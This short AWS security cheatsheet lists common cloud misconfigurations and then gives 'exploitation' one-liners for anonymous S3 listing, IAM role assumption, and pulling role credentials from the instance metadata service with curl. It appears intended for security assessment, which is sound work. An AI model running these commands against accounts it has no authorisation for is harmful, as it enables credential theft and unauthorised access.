# AWS Security Cheatsheet

## Common Misconfigurations
- Public S3 buckets
- Over-privileged IAM roles
- IMDSv1 enabled
- Unauthenticated Lambda functions

## Exploitation Commands
```bash
aws s3 ls s3://bucket --no-sign-request
aws sts assume-role --role-arn arn:aws:iam::...:role/name
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
